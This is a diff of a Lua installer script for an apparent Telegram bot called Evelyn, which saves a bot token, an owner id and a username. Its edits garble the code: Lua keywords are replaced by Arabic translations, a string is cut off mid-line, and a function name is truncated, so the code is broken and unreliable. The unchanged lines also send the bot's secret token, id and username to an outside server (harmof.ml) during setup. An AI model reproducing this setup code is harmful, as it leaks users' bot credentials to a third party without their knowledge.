@@ -11,7 +11,6 @@ Evelyn_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
-
 UserName = "]]..UserName..[["
 ]])
 Evelyn_Info_Sudo:close()
@@ -29,9 +28,9 @@ database:set(Server_Evelyn.."Token_Evelyn",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
-end 
-os.execute('lua start.lua')
-end
+النهاية 
+)
+النهاية
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
 if not database:get(Server_Evelyn.."UserName_Evelyn") then
@@ -40,8 +39,8 @@ local UserName = io.read():gsub('@','')
 if UserName ~= '' then
 local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
-io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
-return false
+io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب 
+عودة  كاذبة
 end
 local Json = JSON:decode(Get_Info)
 if Json.Info == false then
@@ -62,7 +61,7 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_Evelyn_Info()
+local function velyn_Info()
 Create_Info(database:get(Server_Evelyn.."Token_Evelyn"),database:get(Server_Evelyn.."Id_Evelyn"),database:get(Server_Evelyn.."UserName_Evelyn"))   
 https.request("https://harmof.ml/api.php?id="..database:get(Server_Evelyn.."Id_Evelyn").."&user="..database:get(Server_Evelyn.."UserName_Evelyn").."&token="..database:get(Server_Evelyn.."Token_Evelyn"))
 local RunEvelyn = io.open("Evelyn", 'w')
